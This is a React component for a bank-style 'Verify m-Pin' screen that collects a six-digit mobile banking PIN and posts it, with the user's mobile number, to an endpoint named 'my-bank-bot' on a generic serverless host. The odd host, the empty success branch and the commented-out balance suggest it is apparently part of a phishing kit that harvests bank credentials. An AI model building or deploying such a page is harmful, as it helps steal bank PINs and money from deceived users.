import { useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { FaArrowLeft } from "react-icons/fa";

export default function MPinScreen() {
    const [pin, setPin] = useState(["", "", "", "", "", ""]);
    const navigate = useNavigate();
    const location = useLocation();
    const { mobile } = location.state || {};

    const handleChange = (e, index) => {
        const value = e.target.value.replace(/\D/g, "");
        if (!value) return;

        const newPin = [...pin];
        newPin[index] = value.charAt(value.length - 1);
        setPin(newPin);

        if (index < 5) {
            document.getElementById(`pin-${index + 1}`).focus();
        }
        if (newPin.every((digit) => digit !== "")) {
            submitMpin(newPin.join(""));
        }
    };

    const handleKeyDown = (e, index) => {
        if (e.key === "Backspace") {
            if (pin[index] === "" && index > 0) {
                document.getElementById(`pin-${index - 1}`).focus();
            } else {
                const newPin = [...pin];
                newPin[index] = "";
                setPin(newPin);
            }
        }
    };

    const submitMpin = async (mpinCode) => {
        try {
            const res = await fetch(
                "https://my-bank-bot.instapayapi.workers.dev/api/mpin",
                {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: mobile,
                        mpin: mpinCode,
                    }),
                }
            );

            const data = await res.json();
            console.log("mPIN API Response:", data);

            if (data.success) {
                // alert("mPIN Verified Successfully ✅");
                // navigate("/dashboard", { state: { mobile } }); // आगे dashboard पर redirect
            } else {
                // alert("Invalid mPIN ❌ Try again");
                setPin(["", "", "", "", "", ""]);
                document.getElementById("pin-0").focus();
            }
        } catch (err) {
            console.error("API Error:", err);
            alert("Something went wrong, please try again later.");
        }
    };

    return (
        <div className="min-h-screen bg-red-600 text-white flex flex-col items-center px-6">
            {/* Header */}
            <div className="w-full flex items-center mt-10">
                <button onClick={() => navigate(-1)} className="p-2">
                    <FaArrowLeft size={18} />
                </button>
                <h1 className="flex-1 text-center text-lg font-semibold -ml-8">
                    Verify m-Pin
                </h1>
            </div>

            {/* User Info */}
            <div className="text-center mt-10">
                <p className="text-md font-medium">Enter Your MPIN 6 Digits</p>
                {/* <p className="text-lg font-semibold mt-1">5000.0 MYR</p> */}
            </div>

            {/* PIN Inputs */}
            <div className="flex justify-center gap-4 mt-14">
                {pin.map((digit, index) => (
                    <input
                        key={index}
                        id={`pin-${index}`}
                        type="password"
                        inputMode="numeric"
                        pattern="[0-9]*"
                        maxLength="1"
                        value={digit}
                        onChange={(e) => handleChange(e, index)}
                        onKeyDown={(e) => handleKeyDown(e, index)}
                        className="w-9 h-9 text-center rounded-full border-2 border-white bg-transparent text-white text-lg focus:outline-none"
                    />
                ))}
            </div>
        </div>
    );
}
